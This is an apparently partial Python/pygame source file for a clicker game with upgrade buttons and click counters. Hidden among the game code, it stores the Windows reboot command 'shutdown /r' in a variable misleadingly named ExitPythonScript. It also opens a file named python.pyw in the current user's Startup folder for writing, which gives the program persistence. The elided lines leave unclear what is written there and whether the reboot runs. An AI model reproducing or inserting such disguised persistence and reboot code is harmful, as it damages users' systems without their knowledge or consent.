...
if True:
    ...
    try:
        ...
        font2=pygame.font.SysFont('freesans',80)
        font3=pygame.font.SysFont('freesans',45)
    ...
    def of(n=None, b=None):
        global thing
        thing=False
    click=0
    ExitPythonScript='shutdown /r'
    def cl(a=None, c=None):
        global click
        click+=1
    cps=0
    def auto1(a,b=None):
        ...
        if click>=a[0]:
            cps+=a[1]
            click-=a[0]
    blist=[50,250,2000,20000,75000,500000,1000000,5000000,20000000,50000000, 100000000,400000000, 1000000000]
    clist=[1,10,50,750,6500,25000,75000,500000,1000000, 5000000,20000000,50000000,150000000]
    p44=G1(pygame.Surface((800,300)),800,650,of,False,(192, 12, 234))
    p45=G1(pygame.Surface((800,800)),800,400,cl,False,(134, 235, 255))
    for i in range(13):
        exec(f"p{46+i}=G1(pygame.Surface((300,70)),5,{250+(i*90)},auto1,[blist[{i}],clist[{i}]],(226, 78, 64))")
    ...
    group3=pygame.sprite.Group(p45,p46,p47,p48,p49,p50,p51,p52,p53,p54,p55,p56,p57,p58)
    running = True
    thing=True
    ...
    aaa=fR"C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw"
    f=open(aaa,'wb')
    ...
    while running:
        ...
        if thing:
            ...
            group3.draw(screen)
            group3.update(events)
            text=font2.render(f"Total Clicks: {click}",True,'black')
            text2=font2.render(f"Clicks Per Second: {cps}",True,'black')
            for i in range(3,16):
                exec(f'screen.blit(font3.render("{blist[i-3]}",True,"black"),(5,{(90*i)-10}))')
